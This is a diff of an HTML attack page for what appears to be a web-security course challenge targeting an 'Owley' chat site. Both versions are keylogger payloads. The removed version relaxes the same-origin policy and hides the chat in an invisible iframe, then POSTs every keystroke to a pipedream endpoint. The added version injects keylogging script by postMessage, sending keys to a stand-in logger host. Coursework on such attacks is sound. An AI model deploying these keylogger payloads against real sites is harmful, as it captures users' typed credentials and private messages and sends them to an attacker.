@@ -1,42 +1,38 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>Owley Logger</title>
-    <script>
-      document.domain = "websec.saarland"; // Relax SOP
+<head>
+  <title>Owley Madison - SWAG Challenge</title>
+</head>
+<body>
+  <h1>Welcome Owls 🦉</h1>
+  <p>This is the future of owl dating.</p>
 
-      // Function to send logs to your pipedream endpoint
-      function logToServer(data) {
-        fetch("https://eooaktfbjo7cto7.m.pipedream.net", {
-          method: "POST",
-          mode: "no-cors",
-          body: JSON.stringify({ key: data })
-        });
+  <!-- Load the chat page in an iframe -->
+  <iframe id="chatFrame" src="https://chat.owley.websec.saarland/" width="800" height="600"></iframe>
+
+  <script>
+    // Wait until the iframe loads
+    const iframe = document.getElementById("chatFrame");
+
+    iframe.onload = function() {
+      try {
+        // Inject a keylogger using postMessage
+        iframe.contentWindow.postMessage(`
+          (function(){
+            document.addEventListener('keydown', function(e) {
+              fetch('https://your-logger.com/log?key=' + encodeURIComponent(e.key));
+            });
+          })();
+        `, '*'); // * allows to send to any origin
+      } catch (e) {
+        console.error("Error injecting:", e);
       }
+    };
 
-      // Set up keylogger after iframe loads
-      function setupKeylogger() {
-        try {
-          const iframe = document.getElementById("chat_frame");
-          const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
-
-          // Make sure same domain is set
-          iframe.contentWindow.document.domain = "websec.saarland";
-
-          iframe.contentWindow.addEventListener("keydown", function (e) {
-            logToServer(e.key);
-          });
-
-          // Log success
-          logToServer("Keylogger injected successfully");
-        } catch (e) {
-          logToServer("Error injecting keylogger: " + e.message);
-        }
-      }
-    </script>
-  </head>
-  <body>
-    <h1>Welcome Owley 😈</h1>
-    <iframe id="chat_frame" src="https://chat.websec.saarland" onload="setupKeylogger()" style="width:0;height:0;border:0;"></iframe>
-  </body>
+    // Listen for messages if needed
+    window.addEventListener("message", function(event) {
+      console.log("Message received:", event.data);
+    });
+  </script>
+</body>
 </html>
